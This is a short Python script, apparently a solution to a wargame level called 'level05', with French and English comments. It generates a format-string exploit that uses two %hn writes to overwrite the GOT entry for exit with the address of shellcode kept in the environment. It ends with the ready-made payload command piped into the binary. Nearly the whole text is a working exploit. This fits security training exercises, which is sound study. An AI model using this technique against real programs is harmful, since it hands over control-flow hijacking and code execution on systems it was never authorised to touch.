# On veut override exit (0x080497e0) avec l'adresse de notre shellcode (0xffffdc80)

# objdump --dynamic-reloc ./level05
#   080497e0 R_386_JUMP_SLOT   exit

# (gdb) x/20s environ  
# 0xffffdc80:  	"\220\
# dc80 => 56448
# fffff => 65535

by1 = 56448
by2 = 65535

start = 4 * 2
first = by1 - start
second = by2 - by1

print('(python -c \'print "', end='')

# The both (short) addresses of exit to write 2 bytes each
print("\\xe0\\x97\\x04\\x08", end='') # two first bytes of exit
print("\\xe2\\x97\\x04\\x08", end='') # two last bytes of exit

# The length will be the value that we want to write
print("%" + str(first) + "c%10$hn%" + str(second) + "c%11$hn", end='')

print('"\') | ./level05\n')

#(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56440c%10$hn%9087c%11$hn"') | ./level05
